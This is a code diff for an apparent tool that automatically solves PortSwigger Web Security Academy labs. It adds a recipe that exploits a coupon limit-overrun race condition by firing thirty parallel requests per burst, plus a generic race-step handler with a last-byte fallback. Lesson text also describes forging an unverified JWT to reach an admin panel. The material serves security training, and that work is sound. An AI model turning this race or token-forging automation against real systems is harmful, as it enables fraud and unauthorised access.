@@ -13,6 +13,7 @@ a solved lab without the Academy banner.
 
 from __future__ import annotations
 
+import json
 import re
 import threading
 import time
@@ -225,6 +226,31 @@ RECIPES = {
              "lesson": "The session cookie was a signed JWT with payload {iss, exp, sub}. Changing sub to administrator and re-encoding the header and payload, while keeping the original signature, reached the admin panel and deleted carlos. The server decoded the claims but never verified the signature. Test a changed payload with the original signature before trying key confusion."},
         ],
     },
+    "lab-race-conditions-limit-overrun": {
+        "page": "https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun",
+        "title": "Limit overrun race conditions",
+        "steps": [
+            {"kind": "login", "username": "wiener", "password": "peter"},
+            {"kind": "http", "method": "POST", "path": "/cart",
+             "form": {"productId": "1", "redir": "PRODUCT", "quantity": "1"},
+             "expect": {"status": 302}},
+            {"kind": "http", "method": "GET", "path": "/cart",
+             "capture": {"csrf": "name=\"csrf\" value=\"([^\"]+)\""},
+             "expect": {"status": 200, "contains": "/cart/coupon"}},
+            {"kind": "race", "tool": "single_packet_race", "path": "/cart/coupon",
+             "form": {"csrf": "{{csrf}}", "coupon": "PROMO20"},
+             "count": 30, "rounds": 3, "expect": {"status": 200}},
+            {"kind": "http", "method": "GET", "path": "/cart",
+             "capture": {"csrf": "name=\"csrf\" value=\"([^\"]+)\""},
+             "expect": {"status": 200, "contains": "/cart/checkout"}},
+            {"kind": "http", "method": "POST", "path": "/cart/checkout",
+             "form": {"csrf": "{{csrf}}"}, "expect": {"status": 302}},
+            {"kind": "verify"},
+            {"kind": "record",
+             "technique": "Race condition (limit overrun) on a single-use coupon",
+             "lesson": "The coupon handler checked whether the code had already been used before it committed the discount. Sending thirty copies of the same request in one packet-aligned burst let several pass the check before any committed, so the 20 percent discount applied repeatedly and the jacket dropped inside the store credit. The fix is an atomic conditional update or a per-code lock, not a check followed by a separate write."},
+        ],
+    },
 }
 
 
@@ -351,20 +377,32 @@ class LabRunner:
         return value
 
     def _browser_instance(self, page: str) -> str:
-        """Launch a lab through the managed browser when cookies are stale."""
+        """Launch a lab through the managed browser when cookies are stale.
+
+        The Academy now hydrates the launch control with JavaScript, so the
+        plain HTTP page no longer carries a launch href. The browser renders
+        the control, and this waits for the link before following it.
+        """
         state = browser.state("portswigger", base=self.server.base)
         if not state.get("running"):
             browser.launch("portswigger", page, base=self.server.base,
-                           headless=False)
+                           headless=True)
         else:
             browser.goto("portswigger", page, base=self.server.base)
-        snap = browser.snapshot("portswigger", base=self.server.base)
-        link = next((str(item.get("href") or "")
-                     for item in snap.get("items") or []
-                     if "/academy/labs/launch/" in str(item.get("href") or "")), "")
+        link = ""
+        for _ in range(16):
+            snap = browser.snapshot("portswigger", base=self.server.base)
+            link = next((str(item.get("href") or "")
+                         for item in snap.get("items") or []
+                         if "/academy/labs/launch/" in str(item.get("href") or "").lower()), "")
+            if link:
+                break
+            time.sleep(0.5)
         if not link:
             raise RuntimeError(
                 "could not find the launch link in HTTP or the managed browser")
+        if not link.startswith("http"):
+            link = "https://portswigger.net" + link
         result = browser.goto("portswigger", link, base=self.server.base)
         return str(result.get("url") or "").rstrip("/")
 
@@ -512,6 +550,46 @@ class LabRunner:
                     if not match:
                         raise RuntimeError(f"step {index}: capture {name} not found")
                     variables[name] = match.group(1)
+            elif kind == "race":
+                tool = str(step.get("tool") or "single_packet_race")
+                rounds = max(1, min(int(step.get("rounds") or 1), 5))
+                statuses: dict[str, int] = {}
+                for round_index in range(rounds):
+                    args = {
+                        "target": base + step["path"],
+                        "method": step.get("method", "POST"),
+                        "count": int(step.get("count") or 20),
+                        "timeout": step.get("timeout", 20),
+                        "scope": scope,
+                    }
+                    if mission_id:
+                        args["mission_id"] = mission_id
+                    headers = dict(step.get("headers") or {})
+                    if variables.get("cookie"):
+                        headers["cookie"] = variables["cookie"]
+                    if headers:
+                        args["headers"] = headers
+                    if step.get("form"):
+                        args["form"] = self._sub(step["form"], variables)
+                    if step.get("json"):
+                        args["json"] = self._sub(step["json"], variables)
+                    try:
+                        payload = self._call(registry, tool, args)
+                    except RuntimeError as exc:
+                        if tool != "single_packet_race" or "h2" not in str(exc).lower():
+                            raise
+                        emit(Event(type="log", agent="lab", stage=phase["stage"],
+                                   payload={"text": "no h2; using the HTTP/1.1 last-byte race"}))
+                        payload = self._call(registry, "last_byte_race", args)
+                    statuses = payload.get("statuses") or statuses
+                    emit(Event(type="log", agent="lab", stage=phase["stage"], payload={
+                        "text": (f"race round {round_index + 1}/{rounds} over "
+                                 f"{payload.get('count')}: {statuses}")}))
+                variables["race_statuses"] = json.dumps(statuses)
+                expect = step.get("expect") or {}
+                if "status" in expect and not statuses.get(str(expect["status"])):
+                    raise RuntimeError(
+                        f"step {index}: race saw {statuses}, expected HTTP {expect['status']}")
             elif kind == "upload":
                 args = {
                     "target": base + step["path"], "field": step["field"],
